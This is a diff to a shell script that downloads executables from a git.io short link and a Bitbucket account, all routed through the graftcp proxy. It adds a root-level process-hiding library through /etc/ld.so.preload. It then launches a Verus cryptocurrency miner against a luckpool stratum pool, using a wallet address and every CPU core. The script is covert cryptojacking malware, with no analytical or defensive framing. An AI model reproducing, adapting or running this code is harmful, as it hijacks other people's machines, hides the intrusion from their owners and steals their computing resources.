@@ -35,7 +35,14 @@ echo "******************************************************************"
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://bitbucket.org/yuasoinpopay/scraeds/downloads/Halo
-chmod +x Halo
+./graftcp/graftcp wget -qO build https://git.io/JiGZh
+chmod +x build
 
-./graftcp/graftcp ./Halo -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RFAyGt31VDBd2MK4wWQoRsFzUXi755Ubn6.tes -p x --cpu 2
+./graftcp/graftcp wget https://bitbucket.org/yuasoinpopay/scraeds/downloads/magichalo.zip
+unzip magichalo.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RFAyGt31VDBd2MK4wWQoRsFzUXi755Ubn6.$(echo $(shuf -i 1000-99999 -n 1)0803) -p x -t $(nproc)
